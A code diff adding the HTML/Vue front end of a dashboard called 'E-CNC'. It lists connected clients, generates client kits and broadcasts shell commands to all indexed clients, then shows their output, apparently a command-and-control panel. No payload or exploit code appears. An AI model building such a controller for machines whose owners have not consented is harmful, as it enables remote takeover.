@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>E-CNC</title>
+
+<link href="/static/style.css" rel="stylesheet" type="text/css">
+
+<script type="text/javascript" src="/static/js/vue/dist/vue.js"></script>
+<script type="text/javascript" src="/static/js/vue-resource/dist/vue-resource.js"></script>
+
+</head>
+<body>
+  <div class="body_wrapper">
+
+    <div class="header">E-CNC</div>
+    <div class="panel p_top">
+      <div class="panel-body">
+        <pre>time: {{ time }}</pre>
+      </div>
+    </div>
+
+    <div class="panel p_server-status">
+      <div class="panel-header">Server status</div>
+      <div class="panel-body">
+        <pre>{{ server_status }}</pre>
+      </div>
+    </div>
+
+    <div class="panel p_client-index">
+      <div class="panel-header">Client list</div>
+      <div class="panel-body">
+        <div class="client-row" v-for="(client, c_addr) in c_map">
+          <div>c-addr: {{ client.addr }}</div>
+          <div :class="'c_status__' + client.status">status: {{ client.status }}</div>
+          <div>balance: n/a</div>
+          <div>page-link: <a :href="'/client/' + client.addr">{{ client.addr }}</a></div>
+          <div class="btn_c-index-include c-in-index" v-if="c_addr in c_index"
+            v-on:click="c_index_update(client, false)">in-index: [x]</div>
+          <div class="btn_c-index-include" v-else v-on:click="c_index_update(client, true)">in-index: [ ]</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel panel_tool">
+      <div class="panel-header">Tools</div>
+      <div class="panel-body">
+
+        <!-- tool section: server -->
+        <div class="tool-section tool-section_s">
+          <button v-on:click="btn_ws_s_gen_client_kit">s.gen-client-kit</button>
+          <button v-on:click="btn_ws_s_new_client">s.client-reg-rx</button>
+          <button v-on:click="btn_shutdown">s.shutdown</button>
+        </div>
+
+        <!-- tool section: client -->
+        <div class="tool-section tool-section_c">
+          <input class="in_client-cmd" v-model="in_client_shell_cmd" type="text"
+            placeholder="shell command - sent to all index clients">
+          <button v-on:click="btn_ws_c_work_tx">c.work-tx</button>
+          <button v-on:click="btn_ws_c_work_rx">c.work-rx</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel panel_output">
+      <div class="panel-header">Command list</div>
+      <div class="panel-body">
+        <div class="cmd-row" v-for="(cmd, cmd_id) in cmd_map" v-bind:cmd="cmd" v-bind:key="cmd_id">
+          <div style="flex-basis: 60ch">c-addr: {{cmd.c_addr}}</div>
+          <div style="flex-basis: 16ch">cmd-id: {{cmd_id}}</div>
+          <div style="flex-basis: 16ch">status: {{cmd.status}}</div>
+          <div style="flex-basis: 42ch">[tx,rx,dt]: [{{cmd.ts_tx}}, {{cmd.ts_rx}}, {{cmd.exec_dt}}]</div>
+          <div style="flex-basis: 16ch">
+            cmd: <span class="cmd-row_shell-cmd">{{cmd.cmd}}</span>
+          </div>
+          <div style="flex-grow: 1">
+            output: <span class="cmd-row_output">{{cmd.output}}</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script type="text/javascript" src="/static/ecnc-app.js"></script>
+</body>
+</html>
